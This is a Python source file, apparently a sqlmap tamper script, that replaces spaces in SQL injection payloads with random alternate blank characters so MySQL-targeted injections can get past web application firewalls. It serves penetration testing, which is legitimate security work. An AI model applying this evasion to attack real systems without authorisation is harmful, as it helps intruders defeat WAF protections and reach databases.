#!/usr/bin/env python

"""
Copyright (c) 2006-2012 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import os
import random

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload):
    """
    Replaces space character (' ') with a random blank character from a
    valid set of alternate characters

    Example:
        * Input: SELECT id FROM users
        * Output: SELECT%0Bid%0BFROM%A0users

    Requirement:
        * MySQL

    Tested against:
        * MySQL 5.1

    Notes:
        * Useful to bypass several web application firewalls
    """

    # ASCII table:
    #   TAB     09      horizontal TAB
    #   LF      0A      new line
    #   FF      0C      new page
    #   CR      0D      carriage return
    #   VT      0B      vertical TAB        (MySQL and Microsoft SQL Server only)
    #   -       A0      -                   (MySQL only)
    blanks = ('%09', '%0A', '%0C', '%0D', '%0B', '%A0')
    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += random.choice(blanks)
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == " " and not doublequote and not quote:
                retVal += random.choice(blanks)
                continue

            retVal += payload[i]

    return retVal
